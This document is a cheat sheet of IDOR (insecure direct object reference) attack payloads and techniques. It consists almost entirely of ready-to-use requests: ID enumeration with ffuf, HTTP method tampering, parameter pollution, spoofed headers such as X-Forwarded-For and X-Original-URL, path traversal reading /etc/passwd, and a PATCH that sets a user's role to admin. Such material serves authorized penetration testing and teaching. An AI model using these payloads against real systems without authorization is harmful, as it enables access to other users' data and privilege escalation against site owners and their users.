# IDOR Payloads & Techniques

## Common Vulnerable Parameters
```
id=
user_id=
account_id=
order_id=
invoice_id=
file_id=
doc_id=
uid=
pid=
rid=
ref=
```

## Numeric Enumeration
```
GET /api/users/1
GET /api/users/2
GET /api/users/100
GET /api/orders/1001
GET /api/orders/1002

# Automate with ffuf:
ffuf -u https://target.com/api/users/FUZZ -w numbers.txt -mc 200
```

## UUID / GUID Bypass
```
# Sometimes UUIDs are predictable or leaked in other responses
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Try inserting your own UUID from account and swap
# Check JS files, API docs, emails for leaked UUIDs
```

## HTTP Method Tampering
```
GET    /api/users/2      → 403
POST   /api/users/2      → 200
PUT    /api/users/2      → 200
PATCH  /api/users/2      → 200
DELETE /api/users/2      → 200
HEAD   /api/users/2      → 200
```

## Parameter Pollution
```
GET /api/profile?user_id=ATTACKER&user_id=VICTIM
GET /api/profile?user_id=VICTIM&user_id=ATTACKER
POST body: user_id=ATTACKER
Add header: X-User-ID: VICTIM
```

## Indirect References
```
# Hash/encode the ID
GET /api/users/MQ==          (base64 of "1")
GET /api/users/c4ca4238a0b923820dcc509a6f75849b  (MD5 of "1")

# Decode IDs found in responses and enumerate
```

## Path Traversal + IDOR
```
GET /api/files/../../../etc/passwd
GET /api/download?file=../../user2/private.pdf
GET /api/export?report_id=../admin/report
```

## JSON Body Manipulation
```json
{"user_id": 1337}
{"account_id": "VICTIM_ID"}
{"invoice_id": 9999, "user_id": VICTIM}
```

## Horizontal → Vertical Privilege Escalation
```
# Step 1: Find your own ID
GET /api/users/ME → {"id": 42, "role": "user"}

# Step 2: Try admin ID
GET /api/users/1  → {"id": 1, "role": "admin", "email": "admin@corp.com"}

# Step 3: Try modifying role via IDOR
PATCH /api/users/42
{"role": "admin"}
```

## Headers to Try
```
X-User-ID: VICTIM
X-Account-ID: VICTIM
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin/users/VICTIM
X-Rewrite-URL: /admin/users/VICTIM
```

## Checklist
```
[ ] Swap numeric IDs between accounts
[ ] Try IDs in URL, body, headers, cookies
[ ] Test all HTTP methods
[ ] Check indirect references (hashed/encoded IDs)
[ ] Test batch/bulk endpoints
[ ] Check export/download endpoints
[ ] Test password reset / email change flows
[ ] Check referrer or state tokens for IDORs
```
